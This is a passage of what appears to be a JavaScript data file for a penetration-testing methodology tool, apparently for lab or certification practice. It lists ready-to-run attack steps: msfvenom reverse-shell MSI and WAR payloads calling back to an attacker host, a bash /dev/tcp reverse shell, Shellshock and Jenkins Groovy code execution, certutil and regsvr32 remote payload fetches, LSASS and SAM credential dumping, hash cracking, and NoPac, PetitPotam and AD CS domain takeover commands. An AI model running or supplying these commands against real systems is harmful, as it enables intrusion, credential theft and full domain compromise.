        common_mistakes: ['Path must contain spaces (e.g. `Program Files`) without surrounding quotation marks.'],
        if_success: 'Unquoted path found! Drop payload at `C:\\Program Files\\Custom.exe` and restart service.',
        if_failure: 'No unquoted paths. Check AlwaysInstallElevated registry keys.',
        references: ['https://lolbas-project.github.io/']
      },
      {
        id: 'win-always-install-elevated',
        title: 'AlwaysInstallElevated Registry MSI Escalation',
        phase: 'exploitation',
        purpose: 'If AlwaysInstallElevated is set to 1 in both HKLM and HKCU, any low-privileged user can run an MSI installer with SYSTEM privileges.',
        command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST|10.10.14.2}} LPORT=4444 -f msi -o setup.msi && msiexec /quiet /qn /i setup.msi',
        expected_output: ['[Kali Listener: Connection received from {{TARGET}} -> NT AUTHORITY\\SYSTEM]'],
        common_mistakes: ['Must be enabled in BOTH `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer` AND `HKCU\\...`.'],
        if_success: 'SYSTEM reverse shell received on Kali listener!',
        if_failure: 'AlwaysInstallElevated not enabled. Check SAM registry backup dumps.',
        references: ['https://lolbas-project.github.io/']
      }
    ]
  },

  // ==========================================
  // 32. PIVOTING & TUNNELING
  // ==========================================
  {
    id: 'pivoting',
    name: 'Pivoting & Network Tunneling',
    category: 'post-exploitation',
    description: 'Methodology for pivoting into dual-homed subnets and internal active directory networks using Chisel, Ligolo-ng, and SSH SOCKS proxies.',
    requires_shell: true,
    port_triggers: [],
    tags: ['pivoting', 'chisel', 'ligolo-ng', 'tunneling', 'socks5'],
    steps: [
      {
        id: 'pivot-chisel-server',
        title: 'Start Chisel Reverse SOCKS Server on Kali',
        phase: 'post-exploitation',
        purpose: 'Start a Chisel server on your Kali machine listening for reverse SOCKS proxy connections from the compromised host.',
        command: 'chisel server -p 8000 --reverse',
        expected_output: ['2024/03/20 14:00:00 server: Reverse tunnelling enabled', '2024/03/20 14:00:00 server: Listening on http://0.0.0.0:8000'],
        common_mistakes: ['Ensure port 8000 is open and not blocked by local Kali ufw firewall.'],
        if_success: 'Chisel server listening! Run client on compromised target.',
        if_failure: 'Port in use. Choose another port (e.g. 9000).',
        references: ['https://book.hacktricks.xyz/tunneling-and-port-forwarding/chisel-examples']
      },
      {
        id: 'pivot-chisel-client',
        title: 'Connect Chisel Client from Target to Kali',
        phase: 'post-exploitation',
        purpose: 'Connect the compromised target back to your Kali server to create a SOCKS5 proxy on `127.0.0.1:1080`.',
        command: './chisel client {{LHOST|10.10.14.2}}:8000 R:socks',
        expected_output: ['2024/03/20 14:00:02 client: Connected (Latency 25ms)', '2024/03/20 14:00:02 client: tun: r:socks => socks:127.0.0.1:1080'],
        common_mistakes: ['On Windows, use `chisel.exe client {{LHOST}}:8000 R:socks`.'],
        if_success: 'SOCKS5 tunnel active! Scan internal network via `proxychains4 nmap -sT -Pn {{INTERNAL_IP|172.16.1.10}}`.',
        if_failure: 'Connection timed out. Verify Kali IP reachability.',
        references: ['https://book.hacktricks.xyz/tunneling-and-port-forwarding/chisel-examples']
      },
      {
        id: 'pivot-ligolo-tun',
        title: 'Ligolo-ng Fast TUN Interface Setup',
        phase: 'post-exploitation',
        purpose: 'Configure a virtual TUN interface on Kali for native kernel-level IP routing into the target internal subnet (no proxychains needed!).',
        command: 'sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert',
        expected_output: ['[INFO] Listening on 0.0.0.0:11601', 'ligolo-ng >>'],
        common_mistakes: ['Not adding the internal route (`sudo ip route add 172.16.1.0/24 dev ligolo`) after agent connects.'],
        if_success: 'Ligolo proxy ready! Run `./ligolo-agent -connect {{LHOST|10.10.14.2}}:11601 -ignore-cert` on target.',
        if_failure: 'TUN interface creation requires sudo privileges on Kali.',
        references: ['https://book.hacktricks.xyz/tunneling-and-port-forwarding/ligolo-ng']
      }
    ]
  },

  // ==========================================
  // 33. TTY STABILIZATION & FILE TRANSFERS
  // ==========================================
  {
    id: 'shells-transfer',
    name: 'TTY Shell Stabilization & File Transfers',
    category: 'post-exploitation',
    description: 'Techniques for upgrading raw netcat reverse shells to full interactive PTY sessions (with tab completion, arrows, and Ctrl+C support) and transferring files on Windows and Linux.',
    requires_shell: true,
    port_triggers: [],
    tags: ['tty', 'pty', 'file-transfer', 'powershell', 'certutil'],
    steps: [
      {
        id: 'tty-pty-upgrade',
        title: 'Python Interactive PTY Spawn',
        phase: 'post-exploitation',
        purpose: 'Spawn a pseudo-terminal (PTY) inside a raw netcat reverse shell.',
        command: 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
        expected_output: ['user@target:~$'],
        common_mistakes: ['If python3 is missing, try `python -c ...` or `script /dev/null -c bash`.'],
        if_success: 'PTY spawned! Next background with `Ctrl+Z` and run `stty raw -echo; fg`.',
        if_failure: 'No python found. Try `script -qc /bin/bash /dev/null`.',
        references: ['https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-tty']
      },
      {
        id: 'tty-stty-raw',
        title: 'Raw Terminal & Window Resize (Ctrl+Z -> fg)',
        phase: 'post-exploitation',
        purpose: 'Pass raw keystrokes (Ctrl+C, nano, vim, tab completion) directly to the target reverse shell without killing your netcat listener.',
        command: 'stty raw -echo; fg; export TERM=xterm-256color; stty rows 38 columns 116',
        expected_output: ['[Terminal fully interactive with clear, tab completion, and Ctrl+C safety]'],
        common_mistakes: ['Type `reset` if terminal formatting breaks after typing `fg`.'],
        if_success: 'Fully stabilized Linux TTY shell ready for operation.',
        if_failure: 'Check your local terminal rows/columns with `stty size`.',
        references: ['https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-tty']
      },
      {
        id: 'transfer-win-iwr',
        title: 'Windows PowerShell File Download (Invoke-WebRequest)',
        phase: 'post-exploitation',
        purpose: 'Download tools (winPEAS, Mimikatz, Chisel) directly into `C:\\Windows\\Temp\\` using PowerShell.',
        command: 'powershell -c "Invoke-WebRequest -Uri \'http://{{LHOST|10.10.14.2}}:8000/winPEASx64.exe\' -OutFile \'C:\\Windows\\Temp\\winPEAS.exe\'"',
        expected_output: ['[File downloaded to C:\\Windows\\Temp\\winPEAS.exe]'],
        common_mistakes: ['Always download to `C:\\Windows\\Temp\\` or `C:\\Users\\Public\\` which are writable by all users.'],
        if_success: 'File downloaded! Execute with `C:\\Windows\\Temp\\winPEAS.exe`.',
        if_failure: 'PowerShell blocked or restricted. Try `certutil.exe`.',
        references: ['https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-file-transfer']
      },
      {
        id: 'transfer-win-certutil',
        title: 'Windows Certutil Download (Fallback)',
        phase: 'post-exploitation',
        purpose: 'Download files using the native built-in Windows Certificate Utility when PowerShell is restricted.',
        command: 'certutil.exe -urlcache -split -f http://{{LHOST|10.10.14.2}}:8000/nc.exe C:\\Windows\\Temp\\nc.exe',
        expected_output: ['****  Online  ****', 'CertUtil: -URLCache command completed successfully.'],
        common_mistakes: ['Run `certutil -urlcache -split -f http://... delete` to clear cache artifacts if needed.'],
        if_success: 'Tool downloaded successfully via CertUtil.',
        if_failure: 'Antivirus Defender signature detection. Obfuscate binary or use in-memory reflection.',
        references: ['https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-file-transfer']
      }
    ]
  },

  // ==========================================
  // 34. PASSWORD ATTACKS & HASH CRACKING
  // ==========================================
  {
    id: 'password-cracking',
    name: 'Password Attacks & Hash Cracking',
    category: 'passwords',
    description: 'Comprehensive methodology for identifying and cracking password hashes. Covers NTLM, NetNTLMv2, Kerberoast TGS, AS-REP TGT, Linux /etc/shadow, KeePass databases, ZIP/RAR archives, and SSH keys.',
    port_triggers: [],
    tags: ['hashcat', 'john', 'passwords', 'cracking'],
    steps: [
      {
        id: 'hash-identify',
        title: 'Hash Algorithm Identification (nth / hash-identifier)',
        phase: 'enumeration',
        purpose: 'Automatically identify the hashing algorithm and corresponding Hashcat / John format mode.',
        command: "nth --text '{{HASH|31d6cfe0d16ae931b73c59d7e0c089c0}}'",
        expected_output: ['[+] NTLM [Hashcat Mode: 1000]', '[+] MD4 [Hashcat Mode: 900]', '[+] MD5 [Hashcat Mode: 0]'],
        common_mistakes: ['Confusing NTLM (Mode 1000 - 32 hex chars) with NetNTLMv2 (Mode 5600 - username::domain:challenge:hash).'],
        if_success: 'Hash algorithm identified! Select the corresponding Hashcat cracking mode below.',
        if_failure: 'Unknown format. Check if hash includes salt, iterations, or base64 encoding.',
        references: ['https://book.hacktricks.xyz/']
      },
      {
        id: 'hash-crack-ntlm',
        title: 'Crack NTLM Hashes (SAM / LSASS - Mode 1000)',
        phase: 'exploitation',
        purpose: 'Crack 32-character Windows NTLM hashes extracted from SAM registry, LSASS memory, or NTDS.dit database.',
        command: 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O',
        expected_output: ['31d6cfe0d16ae931b73c59d7e0c089c0:Password123!', 'Status: Cracked'],
        common_mistakes: ['Not using `-r /usr/share/hashcat/rules/best64.rule` which mutates rockyou.txt (adds numbers, special chars).'],
        if_success: 'Plaintext password recovered! Use to login via WinRM, SMB, or RDP.',
        if_failure: 'Password not in rockyou.txt with best64 rule. Try Pass-the-Hash with the raw NTLM hash.',
        references: ['https://book.hacktricks.xyz/']
      },
      {
        id: 'hash-crack-netntlmv2',
        title: 'Crack NetNTLMv2 Hashes (Responder Capture - Mode 5600)',
        phase: 'exploitation',
        purpose: 'Crack NetNTLMv2 challenge-response hashes captured via Responder, Inveigh, or LLMNR/NBT-NS spoofing.',
        command: 'hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt -O',
        expected_output: ['admin::CORP:1122334455667788:5c2e3...:Welcome2024!', 'Status: Cracked'],
        common_mistakes: ['NetNTLMv2 hashes CANNOT be used in Pass-the-Hash; they MUST be cracked or relayed (NTLM relay).'],
        if_success: 'Plaintext password cracked! Authenticate to domain services.',
        if_failure: 'Try OneRuleToRuleThemAll or company-specific custom wordlists.',
        references: ['https://book.hacktricks.xyz/']
      },
      {
        id: 'hash-crack-kerberoast',
        title: 'Crack Kerberoast TGS Hashes (Mode 13100)',
        phase: 'exploitation',
        purpose: 'Crack Active Directory Kerberos Service Principal Name (SPN) TGS ticket hashes.',
        command: 'hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O',
        expected_output: ['$krb5tgs$23$*svc_sql*...:SqlServiceAdmin2024', 'Status: Cracked'],
        common_mistakes: ['Service account passwords are frequently complex; run mutation rules (`best64.rule` or `OneRuleToRuleThemAll`).'],
        if_success: 'Service account password cracked! Check if user is member of Domain Admins.',
        if_failure: 'Hash not cracked. Check AS-REP hashes or LDAP descriptions.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'hash-crack-asrep',
        title: 'Crack AS-REP Roasting TGT Hashes (Mode 18200)',
        phase: 'exploitation',
        purpose: 'Crack Kerberos AS-REP response hashes captured from users with pre-authentication disabled.',
        command: 'hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt -O',
        expected_output: ['$krb5asrep$23$svc_backup...:BackupMaster1!', 'Status: Cracked'],
        common_mistakes: ['Ensure hash file format matches Hashcat mode 18200 (starts with `$krb5asrep$23$`).'],
        if_success: 'Account password recovered! Use credentials for domain reconnaissance.',
        if_failure: 'Try rule-based dictionary attacks.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'hash-crack-timeroast',
        title: 'Crack Timeroast MS-SNTP Hashes (Mode 31300)',
        phase: 'exploitation',
        purpose: 'Crack Windows Time Service (W32Time) MS-SNTP authentication digest hashes extracted via Timeroasting.',
        command: 'hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O',
        expected_output: ['$ntp$1$82f9...$91b3...:Password123!', 'Status: Cracked'],
        common_mistakes: [
          'Ensure hash file format matches Hashcat mode 31300 (format `$ntp$1$<salt>$<hash>`).',
          'For John the Ripper, use `john --format=timeroast timeroast.hashes --wordlist=/usr/share/wordlists/rockyou.txt`.'
        ],
        if_success: 'Plaintext account password cracked! Authenticate to domain services.',
        if_failure: 'Password not in rockyou.txt. Try rule mutations or custom wordlists.',
        references: ['https://hashcat.net/wiki/doku.php?id=example_hashes']
      },
      {
        id: 'hash-crack-shadow',
        title: 'Crack Linux /etc/shadow Hashes (SHA-512 $6$ - Mode 1800)',
        phase: 'exploitation',
        purpose: 'Crack salted SHA-512 password hashes extracted from Linux `/etc/shadow`.',
        command: 'hashcat -m 1800 shadow.hashes /usr/share/wordlists/rockyou.txt -O',
        expected_output: ['$6$salt$hash...:dragon', 'Status: Cracked'],
        common_mistakes: ['SHA-512 is compute-intensive; use GPU mode with `-O` (optimized kernel) and `-w 3`.'],
        if_success: 'Linux root/user password cracked! Login via `su -` or `ssh`.',
        if_failure: 'Complex password. Look for SSH keys or writable files instead.',
        references: ['https://book.hacktricks.xyz/']
      },
      {
        id: 'hash-crack-keepass',
        title: 'Crack KeePass Password Manager Database (keepass2john)',
        phase: 'exploitation',
        purpose: 'Extract and crack the master password protecting a `.kdbx` KeePass password vault.',
        command: 'keepass2john database.kdbx > keepass.hash && hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -O',
        expected_output: ['$keepass$*2*60000*...:MyMasterPass2024', 'Status: Cracked'],
        common_mistakes: ['Remove the filename prefix from `keepass.hash` before feeding into Hashcat mode 13400.'],
        if_success: 'Master password found! Open database.kdbx with `kpcli` or KeePassXC to dump all credentials.',
        if_failure: 'Strong master password. Check if keyfile (`.key`) was required.',
        references: ['https://book.hacktricks.xyz/']
      },
      {
        id: 'hash-crack-zip',
        title: 'Crack Encrypted ZIP & RAR Archives (zip2john / rar2john)',
        phase: 'exploitation',
        purpose: 'Extract and crack password-protected ZIP, RAR, or 7z backup archives.',
        command: 'zip2john backup.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash',
        expected_output: ['Loaded 1 password hash (PKZIP)', 'hunter2    (backup.zip)'],
        common_mistakes: ['For RAR files, use `rar2john backup.rar > rar.hash`.'],
        if_success: 'Archive password cracked! Unzip archive with `7z x backup.zip -p<password>`.',
        if_failure: 'Password not in wordlist. Check target notes for custom passwords.',
        references: ['https://book.hacktricks.xyz/']
      }
    ]
  },

  // ==========================================
  // 35. ATTACKING COMMON APPLICATIONS & CMS
  // ==========================================
  {
    id: 'common-apps',
    name: 'Attacking Common Web Applications & CMS',
    category: 'web',
    description: 'Methodology for attacking enterprise web applications and CMS platforms: WordPress, Tomcat Manager, Jenkins Script Console, Drupalgeddon, and CGI Shellshock.',
    port_triggers: [80, 443, 8000, 8080, 8443, 8978],
    service_triggers: ['http', 'https', 'web', 'http-alt'],
    tags: ['wordpress', 'tomcat', 'jenkins', 'drupal', 'shellshock', 'cms'],
    steps: [
      {
        id: 'apps-wpscan-enum',
        title: 'WordPress Plugin & User Enumeration (WPScan)',
        phase: 'enumeration',
        purpose: 'Scan WordPress installation for vulnerable plugins, themes, and enumerate usernames via REST API and author archives.',
        command: 'wpscan --url {{TARGET_URL}} --enumerate p,t,u --plugins-detection aggressive',
        expected_output: ['[+] WordPress version 5.8 identified', '[i] Plugin: simple-file-list (v4.2.2) - Unauthenticated RCE', '[+] Users: admin, editor, webmaster'],
        common_mistakes: ['Not using `--plugins-detection aggressive` if passive mode misses custom plugins.'],
        if_success: 'Vulnerable plugin found! Search Exploit-DB for public Metasploit/Python exploit.',
        if_failure: 'No vulnerable plugins. Try password bruteforce on `xmlrpc.php` or `wp-login.php`.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress']
      },
      {
        id: 'apps-tomcat-war-upload',
        title: 'Tomcat Manager Authenticated WAR File Upload',
        phase: 'exploitation',
        purpose: 'Deploy a malicious `.war` payload to Tomcat Manager GUI/API (`/manager/html` or `/manager/text`) to spawn a reverse shell.',
        command: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST|10.10.14.2}} LPORT=4444 -f war -o revshell.war && curl -u "{{USERNAME|tomcat}}:{{PASSWORD|s3cret}}" -T revshell.war "{{TARGET_URL}}/manager/text/deploy?path=/revshell&update=true" && curl -s "{{TARGET_URL}}/revshell/"',
        expected_output: ['OK - Deployed application at context path [/revshell]', '[Kali Listener: Connection received from {{TARGET}}]'],
        common_mistakes: ['Test default Tomcat credentials: `tomcat:s3cret`, `admin:admin`, `tomcat:tomcat`, `admin:password`.'],
        if_success: 'Java reverse shell spawned on Kali listener! Stabilize shell.',
        if_failure: 'Manager access denied (403/401). Check AJP port 8009 (Ghostcat CVE-2020-1938).',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat']
      },
      {
        id: 'apps-jenkins-groovy-rce',
        title: 'Jenkins Script Console Groovy Command Execution',
        phase: 'exploitation',
        purpose: 'Execute arbitrary Java/Groovy code on the Jenkins controller or agents via the `/script` administrative console.',
        command: 'curl -s -u "{{USERNAME|admin}}:{{PASSWORD|password}}" -d "script=println+\'whoami\'.execute().text" "{{TARGET_URL}}/scriptText"',
        expected_output: ['jenkins', 'nt authority\\system', 'root'],
        common_mistakes: ['To spawn a reverse shell, execute: `String host="{{LHOST|10.10.14.2}}";int port=4444;Process p=new ProcessBuilder("/bin/bash","-i").redirectErrorStream(true).start();...`.'],
        if_success: 'Command executed! Spawn interactive reverse shell.',
        if_failure: 'Script console restricted. Check for unauthenticated CLI / CVE-2024-23897.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jenkins']
      },
      {
        id: 'apps-shellshock-cgi',
        title: 'CGI Shellshock Remote Code Execution (CVE-2014-6271)',
        phase: 'exploitation',
        purpose: 'Inject bash function definition payloads into HTTP User-Agent / Referer headers to execute commands via vulnerable CGI scripts.',
        command: 'curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c \'id; whoami\'" "{{TARGET_URL}}/cgi-bin/test.cgi"',
        expected_output: ['uid=33(www-data) gid=33(www-data) groups=33(www-data)'],
        common_mistakes: ['Ensure target endpoint is an executable `.cgi` or `.sh` script inside `/cgi-bin/`.'],
        if_success: 'Shellshock RCE confirmed! Trigger reverse shell: `/bin/bash -i >& /dev/tcp/{{LHOST|10.10.14.2}}/4444 0>&1`.',
        if_failure: 'CGI script not vulnerable or bash patched. Check other web endpoints.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi']
      }
    ]
  },

  // ==========================================
  // 36. WINDOWS PRIVILEGED GROUPS & TOKENS
  // ==========================================
  {
    id: 'win-priv-groups',
    name: 'Windows Privileged Groups & Token Exploitation',
    category: 'privesc',
    description: 'Methodology for escalating privileges via specialized Windows built-in groups and user rights: Backup Operators, DNSAdmins, Server Operators, Print Operators, and SeDebugPrivilege.',
    requires_shell: true,
    target_os: 'windows',
    port_triggers: [],
    tags: ['windows', 'privesc', 'backup-operators', 'dnsadmins', 'sedebug', 'tokens'],
    steps: [
      {
        id: 'win-backup-operators-sam',
        title: 'Backup Operators / SeBackupPrivilege SAM & SYSTEM Dump',
        phase: 'exploitation',
        purpose: 'Abuse `SeBackupPrivilege` / `Backup Operators` group membership to read locked registry hives (SAM, SYSTEM) or copy `ntds.dit` without administrative locks.',
        command: 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive /y',
        expected_output: ['The operation completed successfully.'],
        common_mistakes: ['Download `sam.hive` and `system.hive` to Kali and dump with `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`.'],
        if_success: 'Local Administrator NTLM hashes extracted! Use Pass-the-Hash to login.',
        if_failure: 'If on Domain Controller, use `diskshadow` or `robocopy /b` to copy `C:\\Windows\\NTDS\\ntds.dit`.',
        references: ['https://lolbas-project.github.io/']
      },
      {
        id: 'win-dnsadmins-dll',
        title: 'DNSAdmins Group ServerLevelPluginDll Injection',
        phase: 'exploitation',
        purpose: 'If member of `DNSAdmins` group, configure the Microsoft DNS Server service to load a malicious plugin DLL from your SMB share and restart DNS as SYSTEM.',
        command: 'dnscmd.exe {{TARGET}} /config /serverlevelplugindll \\\\{{LHOST|10.10.14.2}}\\share\\plugin.dll && sc.exe \\\\{{TARGET}} stop DNS && sc.exe \\\\{{TARGET}} start DNS',
        expected_output: ['Registry property serverlevelplugindll successfully reset.', 'SERVICE_NAME: DNS | STATE: RUNNING'],
        common_mistakes: ['Host payload DLL on an unauthenticated SMB share (e.g. `impacket-smbserver share /tmp -smb2support`).'],
        if_success: 'DNS Server restarted and loaded your DLL as NT AUTHORITY\\SYSTEM!',
        if_failure: 'Access denied stopping DNS. Server might reboot on schedule or wait for admin.',
        references: ['https://lolbas-project.github.io/']
      },
      {
        id: 'win-sedebug-lsass',
        title: 'SeDebugPrivilege Direct LSASS Memory Dump',
        phase: 'exploitation',
        purpose: 'Use `SeDebugPrivilege` to attach to the `lsass.exe` process and dump its memory for offline plaintext password and NTLM extraction.',
        command: 'procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp',
        expected_output: ['[+] Dumping process 648 (lsass.exe)...', '[+] Dump count reached: Dump 1 complete.'],
        common_mistakes: ['On Kali, parse the dump with `pypykatz lsa minidump lsass.dmp`.'],
        if_success: 'LSASS dumped! Extracted cleartext passwords and Kerberos tickets.',
        if_failure: 'Windows Defender or PPL (Protected Process Light) blocking LSASS access. Use Task Manager GUI dump or Nanodump.',
        references: ['https://lolbas-project.github.io/']
      },
      {
        id: 'win-server-operators-service',
        title: 'Server Operators Service Reconfiguration',
        phase: 'exploitation',
        purpose: 'Members of `Server Operators` can modify and restart system services; reconfigure a service `binPath` to add your user to Local Administrators.',
        command: 'sc.exe config AppReadiness binPath= "cmd.exe /c net localgroup Administrators {{USERNAME}} /add" && sc.exe start AppReadiness',
        expected_output: ['[SC] ChangeServiceConfig SUCCESS', '[SC] StartService SUCCESS'],
        common_mistakes: ['Put spaces after `binPath=` (e.g. `binPath= "..."`).'],
        if_success: 'User added to Administrators! Open new shell with administrative privileges.',
        if_failure: 'Service disabled. Try alternate services like `Fax`, `Spooler`, or `WerSvc`.',
        references: ['https://lolbas-project.github.io/']
      }
    ]
  },

  // ==========================================
  // 37. ADVANCED ACTIVE DIRECTORY & TRUSTS
  // ==========================================
  {
    id: 'ad-domain-trusts-nopac',
    name: 'Advanced Active Directory (NoPac, PetitPotam, Trusts)',
    category: 'ad',
    description: 'Methodology for critical domain privilege escalation: NoPac sAMAccountName Spoofing (CVE-2021-42278/42287), PetitPotam AD CS Certificate Relay, Responder LLMNR Poisoning, and Cross-Forest Domain Trusts.',
    port_triggers: [88, 389, 445],
    service_triggers: ['kerberos', 'ldap', 'smb'],
    tags: ['active-directory', 'nopac', 'petitpotam', 'adcs', 'trusts', 'responder'],
    steps: [
      {
        id: 'ad-responder-llmnr',
        title: 'LLMNR / NBT-NS Poisoning (Responder)',
        phase: 'reconnaissance',
        purpose: 'Poison broadcast LLMNR/NBT-NS queries on the local subnet to capture NetNTLMv2 hashes or relay authentication.',
        command: 'sudo responder -I tun0 -dwv -F',
        expected_output: ['[+] [LLMNR]  Poisoned answer sent to 10.10.10.50 for name WIN-SRV', '[+] [SMB] NTLMv2-SSP Client: 10.10.10.50', '[+] [SMB] Hash: jdoe::CORP:8a3f...'],
        common_mistakes: ['Turn off `SMB = Off` and `HTTP = Off` in `/etc/responder/Responder.conf` if using ntlmrelayx instead.'],
        if_success: 'NetNTLMv2 hash captured! Crack with Hashcat mode 5600.',
        if_failure: 'No broadcast traffic. Trigger artificial SMB traffic with `xp_dirtree` or browser UNC paths.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'ad-nopac-exploit',
        title: 'NoPac Domain Controller Takeover (CVE-2021-42278 / 42287)',
        phase: 'privesc',
        purpose: 'Exploit sAMAccountName spoofing to obtain a Kerberos Service Ticket for the Domain Controller as DA without admin credentials.',
        command: 'python3 noPac.py "{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}" -dc-ip {{TARGET}} --impersonate Administrator -use-ldap -dump-ws',
        expected_output: ['[*] Domain Controller: DC.corp.local', '[*] Impersonating Administrator...', '[+] Dumping DC hashes: Administrator:500:aad3b4...:31d6cfe0...:::'],
        common_mistakes: ['Standard user must have permission to create a machine account (`MachineAccountQuota` > 0).'],
        if_success: 'Full Domain Controller takeover! Dumped all domain credentials.',
        if_failure: 'Domain Controller is patched (post-Nov 2021 update). Test AD CS or DCSync.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'ad-petitpotam-adcs',
        title: 'PetitPotam MS-EFSRPC & AD CS NTLM Relay',
        phase: 'privesc',
        purpose: 'Coerce Domain Controller authentication over MS-EFSRPC and relay it to AD CS Web Enrollment to obtain a machine certificate for the DC.',
        command: 'impacket-ntlmrelayx -t "http://{{CA_SERVER|ca.corp.local}}/certsrv/certfnsh.asp" -smb2support --template DomainController & python3 PetitPotam.py {{LHOST|10.10.14.2}} {{TARGET}}',
        expected_output: ['[*] Requesting certificate for DC$ from CA...', '[*] Got certificate (base64): MIIE...'],
        common_mistakes: ['Request TGT with `gettgtpkinit.py` using the base64 certificate to get DC Kerberos ticket.'],
        if_success: 'Domain Controller certificate acquired! Generate Golden Ticket with krbtgt.',
        if_failure: 'EPA (Extended Protection for Authentication) enabled on AD CS or MS-EFSRPC filtered.',
        references: ['https://wadcoms.github.io/']
      }
    ]
  },

  // ==========================================
  // 38. LIVING OFF THE LAND (LOLBAS & GTFOBINS)
  // ==========================================
  {
    id: 'lolbas-gtfobins',
    name: 'Living Off The Land (LOLBAS & GTFOBins)',
    category: 'privesc',
    description: 'Fast reference for weaponizing native signed operating system binaries on Windows (LOLBAS) and Linux (GTFOBins) for file transfers, proxying, and stealthy code execution.',
    requires_shell: true,
    port_triggers: [],
    tags: ['lolbas', 'gtfobins', 'living-off-the-land', 'evasion', 'stealth'],
    steps: [
      {
        id: 'lolbas-win-execution',
        title: 'Windows Signed Binary Code Execution (Regsvr32 / Mshta)',
        phase: 'exploitation',
        purpose: 'Execute remote payloads using Microsoft-signed binaries to evade application whitelisting and Antivirus inspection.',
        command: 'regsvr32.exe /s /n /u /i:http://{{LHOST|10.10.14.2}}:8000/payload.sct scrobj.dll',
        expected_output: ['[HTTP Server: GET /payload.sct -> Connection received on Kali reverse shell]'],
        common_mistakes: ['Payload `.sct` must contain XML scriptlet format with VBScript or JScript payload.'],
        if_success: 'Payload executed via signed Microsoft binary!',
        if_failure: 'Outbound HTTP traffic blocked. Test bitsadmin or rundll32.',
        references: ['https://lolbas-project.github.io/']
      },
      {
        id: 'gtfobins-linux-breakout',
        title: 'Linux GTFOBins Sudo / SUID Instant Shells',
        phase: 'privesc',
        purpose: 'Quick reference for obtaining instant root shells from common GTFOBins binaries when allowed in `sudo -l` or found with SUID bit.',
        command: 'echo "vim: sudo vim -c \':!/bin/sh\' | find: sudo find . -exec /bin/sh \\; -quit | awk: sudo awk \'BEGIN {system(\\"/bin/sh\\")}\' | env: sudo env /bin/sh"',
        expected_output: ['# whoami', 'root'],
        common_mistakes: ['Check https://gtfobins.github.io/ for the full searchable list of over 400 binaries.'],
        if_success: 'Root shell spawned!',
        if_failure: 'Check Linux capabilities (`getcap -r / 2>/dev/null`).',
        references: ['https://gtfobins.github.io/']
      }
    ]
  },

  // ==========================================
  // 39. AD CS & SHADOW CREDENTIALS
  // ==========================================
  {
    id: 'adcs',
    name: 'Active Directory Certificate Services (AD CS & Certipy)',
    category: 'ad',
    description: 'Comprehensive methodology from Orange Cyberdefense mindmap for auditing and exploiting AD CS certificate templates (ESC1-ESC8), Shadow Credentials, and Pass-the-Certificate.',
    port_triggers: [80, 443, 389, 445, 88],
    service_triggers: ['adcs', 'certsrv', 'ca'],
    tags: ['adcs', 'certipy', 'shadow-credentials', 'esc1', 'certificates'],
    steps: [
      {
        id: 'adcs-certipy-find',
        title: 'AD CS Vulnerable Certificate Template Discovery (Certipy)',
        phase: 'enumeration',
        purpose: 'Query Active Directory Certificate Services to detect misconfigured and exploitable certificate templates (ESC1, ESC2, ESC3, ESC4, ESC8).',
        command: "certipy find -u '{{USERNAME}}@{{DOMAIN|corp.local}}' -p '{{PASSWORD}}' -dc-ip {{TARGET}} -vulnerable -stdout",
        expected_output: ['[*] Finding certificate templates...', '[!] Vulnerabilities', '    ESC1: Client Authentication, Enrollee Supplies Subject, Any Purpose', '    Template: UserTemplate'],
        common_mistakes: ['Not supplying `-dc-ip` if DNS is unable to resolve Domain Controller FQDN.'],
        if_success: 'Vulnerable ESC template found! Request administrative certificate.',
        if_failure: 'No ESC1-ESC4 templates found. Check Web Enrollment NTLM relay (ESC8).',
        references: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/']
      },
      {
        id: 'adcs-esc1-request',
        title: 'ESC1 Template Request with Administrator UPN SAN',
        phase: 'exploitation',
        purpose: 'Request an enrollment certificate supplying the Domain Administrator UPN as an alternate Subject Alternative Name (SAN).',
        command: "certipy req -u '{{USERNAME}}@{{DOMAIN|corp.local}}' -p '{{PASSWORD}}' -ca '{{CA_NAME|CORP-CA}}' -template '{{TEMPLATE|UserTemplate}}' -upn 'administrator@{{DOMAIN|corp.local}}' -dc-ip {{TARGET}}",
        expected_output: ['[*] Requesting certificate...', '[*] Successfully requested certificate', '[*] Saved certificate and private key to `administrator.pfx`'],
        common_mistakes: ['Ensure template name and CA name match exact casing from `certipy find` output.'],
        if_success: '`administrator.pfx` certificate generated! Authenticate via PKINIT / Pass-the-Certificate.',
        if_failure: 'Certificate enrollment rejected (Approval required). Check ESC8 relay.',
        references: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/']
      },
      {
